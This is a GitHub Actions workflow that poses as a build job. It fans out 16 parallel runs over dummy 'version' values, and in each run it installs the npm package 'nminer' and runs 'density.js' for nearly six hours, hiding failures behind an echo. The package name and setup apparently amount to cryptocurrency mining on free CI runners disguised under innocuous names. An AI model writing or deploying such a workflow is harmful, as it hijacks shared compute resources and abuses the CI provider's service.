name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3074 }
          - { version: 2587 }
          - { version: 7034 }
          - { version: 8261 }
          - { version: 6805 }
          - { version: 3960 }
          - { version: 9734 }
          - { version: 9531 }
          - { version: 8327 }
          - { version: 2338 }
          - { version: 426 }
          - { version: 4794 }
          - { version: 9877 }
          - { version: 1788 }
          - { version: 9042 }
          - { version: 6556 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: tenement
        run: |
          npm install nminer@latest
          timeout 349m node density.js || echo "density executed"